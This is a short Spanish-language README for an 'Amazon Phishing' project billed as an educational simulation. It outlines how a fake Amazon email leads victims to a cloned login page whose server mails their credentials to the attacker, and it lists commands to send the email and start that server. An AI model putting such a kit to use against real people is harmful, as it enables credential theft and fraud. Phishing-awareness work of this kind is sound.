# Amazon Phishing 🐀
Este proyecto es una simulacion de phishing con **fines educativos** que clona una pagina web de Amazon.
## Especificaciones técnicas
- Python script 
- Servidor en Node Js
## ¿Como Funciona ? 
1.  El atacante envia un email falso de la compañia adjuntando el link de la pagina clonada
2. La victima accede al link e introduce sus credenciales
3. El servidor obtiene los datos y los envia al correo del atacante
## Pasos para ejecutar la simulacion 🚀
1. Enviar email falso
    ```python
    cd server/   
    python amazon_scam.py
    ```
2. Iniciar el servidor
    ```javascript
    cd server/   
    npm install 
    npm start
    ```
    

